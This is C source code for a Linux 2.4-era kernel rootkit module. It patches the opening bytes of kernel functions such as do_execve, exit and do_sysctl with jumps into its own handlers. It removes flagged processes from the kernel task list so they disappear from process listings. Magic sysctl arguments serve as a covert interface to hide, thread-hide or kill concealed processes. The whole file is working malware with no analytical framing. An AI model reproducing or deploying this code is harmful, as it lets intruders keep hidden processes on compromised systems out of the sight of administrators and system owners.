#define __KERNEL__
#define MODULE
#define LINUX
#ifdef CONFIG_MODVERSIONS
#define MODVERSIONS
#include <linux/modversions.h>
#endif
#include <linux/module.h>
#include <linux/kernel.h>
#include <sys/syscall.h>
#include <linux/sched.h>
#include "config.h"

#define PF_INVISIBLE 0x1000000
extern void * sys_call_table[];
void eraser(struct task_struct *p);
#define SIGHIDE 333
#define SIGTHIDE 777
#define SIGHKILL 666
#define CODESIZE 7
#define CODEBACK2 8 
static char second_backup[CODEBACK2+7]="\x90\x90\x90\x90\x90\x90\x90\x90\xb8\x00\x00\x00\x00\xff\xe0";
static char first_backup[CODEBACK1+7];
static char third_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
static char fourth_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";
static char fifth_backup[CODESIZE]="\x90\x90\x90\x90\x90\x90\x90";

static char inj_first_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
static char inj_second_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
static char inj_third_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
static char inj_fourth_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";
static char inj_fifth_code[CODESIZE]="\xb8\x00\x00\x00\x00\xff\xe0";

struct task_struct *init;
unsigned long *second_addr,*third_addr,*fourth_addr,*fifth_addr;

int (*o_kill)(int pid,int sig);
void (*o_function)(void)=(void*) O_F_ADD;

void first_function(void) {

	write_lock_irq(&tasklist_lock);
	(&init_task)->next_task=(&init_task)->p_pptr;
        write_unlock_irq(&tasklist_lock);
	asm volatile ("mov %ebp,%esp;popl %ebp;jmp first_backup");
	 
}

void second_function(void) {

	struct task_struct *p;
	long wflag;
	write_lock_irqsave(&tasklist_lock,wflag);	
	(&init_task)->next_task=init;
RESTART:
	p=&init_task;
	do {
		if( ((p->flags & PF_INVISIBLE)==PF_INVISIBLE) &&
                    (strcmp(p->comm,"bash"))) { 
			/* We can't thide the current working shell from
			 * here, so we must avoid the auto hding of all shells
			 * and thide them by hand
			 */
			 
			eraser(p);
   	    		goto RESTART; 
                }
		p=p->next_task;
		
        }
	   while(p!=&init_task);
	if(init->prev_task!=&init_task)
	   init->prev_task=&init_task;
	write_unlock_irqrestore(&tasklist_lock,wflag);
	asm volatile("mov %ebp, %esp; popl %ebp; jmp second_backup");
}

void eraser(struct task_struct *p) {
	struct task_struct *father;
	long sflag;
	spin_lock_irqsave(&runqueue_lock,sflag);
        father=p->p_pptr;
	if(p->state!=TASK_ZOMBIE) {
		
               if(p->prev_task!=&init_task) {
                  REMOVE_LINKS(p);
	       }
               else {
                  current->prev_task->p_pptr=current->next_task;
                  current->next_task->prev_task=current->prev_task;
                          if ((current)->p_osptr)
                               (current)->p_osptr->p_ysptr = (current)->p_ysptr;
                          if ((current)->p_ysptr)
                               (current)->p_ysptr->p_osptr = (current)->p_osptr;
                          else
                               (current)->p_pptr->p_cptr = (current)->p_osptr;
               }
	p->next_task=init_task.p_pptr;
	p->prev_task=(&init_task)->p_pptr->prev_task;
        p->p_pptr=father;
		if(p->next_task->pid!=1)
        		p->next_task->prev_task=p;
		else
			p->next_task->prev_task=&init_task;
        init_task.p_pptr=p;
        p->flags |= (PF_INVISIBLE);
        (p)->p_ysptr = NULL;
          if (((p)->p_osptr = (p)->p_pptr->p_cptr) != NULL)
               (p)->p_osptr->p_ysptr = p;
        (p)->p_pptr->p_cptr = p;
	}
	spin_unlock_irqrestore(&runqueue_lock,sflag);
}

void third_function(void) {
	long wflag,sflag;
	if  ((current->flags & PF_INVISIBLE)==PF_INVISIBLE) { 
		spin_lock_irqsave(&runqueue_lock,sflag);
		write_lock_irqsave(&tasklist_lock,wflag);
		if((current->prev_task)==(&init_task)) {
                        current->prev_task->p_pptr=current->next_task;
               	}
		write_unlock_irqrestore(&tasklist_lock,wflag);
		spin_unlock_irqrestore(&runqueue_lock,sflag);
	}
	asm volatile("mov %ebp, %esp; popl %ebp; jmp third_backup");

}

void fourth_function(void) {
	long wflag;
	if((current->flags & PF_INVISIBLE) == PF_INVISIBLE) {
		write_lock_irqsave(&tasklist_lock,wflag);
		if(!(((current->prev_task->flags & PF_INVISIBLE)== PF_INVISIBLE)
					||
		    (current->prev_task==&init_task)))
		eraser(current);
		write_unlock_irqrestore(&tasklist_lock,wflag);
         }
asm volatile("mov %ebp, %esp; popl %ebp; jmp fourth_backup");
}


int (*o_do_sysctl)(int *name, int nlen, void *oldval, size_t *oldlenp,void *newval, size_t newlen)=(void *)O_DO_SYSCTL;
int n_do_sysctl (int *name, int nlen, void *oldval, size_t *oldlenp,void *newval, size_t newlen) {
  int pid,sig;
  struct task_struct *p,*father;
  long wflag,sflag;
  int found=1;
					
    if((name==NULL) && (oldval==NULL) && (oldlenp==NULL) && (newval==NULL)) {
	sig=(int)nlen;
	pid=(int)newlen;
		switch(sig) {
			case SIGHIDE : read_lock(&tasklist_lock);
					for_each_task(p) 
					       if(p->pid==pid) {
						       p->flags |= (PF_INVISIBLE);
						       found=0;
						       break;
					       }
				       read_unlock(&tasklist_lock);
				       if(found)
					       return -1;
				       else
					       return 0;
				       break;
			
			case SIGTHIDE :	spin_lock_irqsave(&runqueue_lock,sflag);
					write_lock_irqsave(&tasklist_lock,wflag);
					
				       	for_each_task(p)
						if(p->pid==pid) {
							
								father=p->p_pptr;
								REMOVE_LINKS(p);
								p->next_task=init_task.p_pptr;
								p->prev_task=&init_task;
								p->p_pptr=father;
								p->next_task->prev_task=p;
								init_task.p_pptr=p;
								p->flags |= (PF_INVISIBLE);
								(p)->p_ysptr = NULL;
								  if (((p)->p_osptr = (p)->p_pptr->p_cptr) != NULL)
									(p)->p_osptr->p_ysptr = p;
								(p)->p_pptr->p_cptr = p;
							found=0;
							break;
						}

					write_unlock_irqrestore(&tasklist_lock,wflag);
					spin_unlock_irqrestore(&runqueue_lock,sflag);
					if(found)
                                               return -1;
                                        else
                                               return 0;
                                       break;
															

			case SIGHKILL :	spin_lock_irqsave(&runqueue_lock,sflag);
					write_lock_irqsave(&tasklist_lock,wflag);
					
					p=init_task.p_pptr;
					while(p!=&init_task) {
						if(p->pid==pid) {
							if ((&init_task)->p_pptr==p) {
					                    p->prev_task->p_pptr=p->next_task;
							    p->next_task->prev_task=p->prev_task;
								if ((current)->p_osptr)
									p->p_osptr->p_ysptr = (p)->p_ysptr;
								if ((p)->p_ysptr)
								        (p)->p_ysptr->p_osptr = (p)->p_osptr;
								else
								        (p)->p_pptr->p_cptr = (p)->p_osptr;
							
							}
							else 
								REMOVE_LINKS(p);
							
							SET_LINKS(p);
							(*o_kill)(p->pid,9);
							
							break;
						}
						p=p->next_task;
					}
					found=0;
					write_unlock_irqrestore(&tasklist_lock,wflag);	
					spin_unlock_irqrestore(&runqueue_lock,sflag);
					
					if(found)
						return -1;
					else
						return 0;
					break;
		}
    }
	else {
		memcpy(fifth_addr,fifth_backup,CODESIZE);
		sig=o_do_sysctl(name,nlen,oldval,oldlenp,newval,newlen);
		memcpy(fifth_addr,inj_fifth_code,CODESIZE);
		return sig;
	}
	return -1;

}




int init_module(void) {
	
	EXPORT_NO_SYMBOLS;
	for_each_task(init)
		if((init->pid)==1)
			break;
	
(&init_task)->p_pptr=init;
memcpy(first_backup,o_function,CODEBACK1);
do {
	int i=0;
	for(;i<CODESIZE;i++)
		first_backup[CODEBACK1+i]=inj_first_code[i];
}
while(0);

*(unsigned long *)&inj_first_code[1]=(unsigned long)first_function;
*(unsigned long *)&inj_second_code[1]=(unsigned long)second_function;
*(unsigned long *)&inj_third_code[1]=(unsigned long)third_function;
*(unsigned long *)&inj_fourth_code[1]=(unsigned long)fourth_function;
*(unsigned long *)&inj_fifth_code[1]=(unsigned long)n_do_sysctl;


*(unsigned long*)&first_backup[CODEBACK1+1]=(unsigned long)(O_F_ADD+CODEBACK1);
*(unsigned long*)&second_backup[CODEBACK2+1]=(unsigned long)(O_E_ADD+CODEBACK2);

second_addr=(unsigned long*)O_E_ADD;
third_addr=(unsigned long*)O_EXIT_END;
fourth_addr=(unsigned long*)O_DO_EXECVE_END;
fifth_addr=(unsigned long*)O_DO_SYSCTL;

memcpy(second_backup,second_addr,CODEBACK2);
memcpy(third_backup,third_addr,CODESIZE);
memcpy(fourth_backup,fourth_addr,CODESIZE);
memcpy(fifth_backup,fifth_addr,CODESIZE);

memcpy(o_function,inj_first_code,CODESIZE);
memcpy(second_addr,inj_second_code,CODESIZE);
memcpy(third_addr,inj_third_code,CODESIZE);
memcpy(fourth_addr,inj_fourth_code,CODESIZE);
memcpy(fifth_addr,inj_fifth_code,CODESIZE);

o_kill=sys_call_table[SYS_kill];

return 0;
}

void cleanup_module(void) {
	
	memcpy(o_function,first_backup,CODEBACK1);
	memcpy(second_addr,second_backup,CODEBACK2);
	memcpy(third_addr,third_backup,CODESIZE);
	memcpy(fourth_addr,fourth_backup,CODESIZE);
	memcpy(fifth_addr,fifth_backup,CODESIZE);
	init_task.next_task=init_task.p_pptr;
	init_task.p_pptr=(&init_task);
	init->prev_task=(&init_task);
	
}

MODULE_LICENSE("GPL");
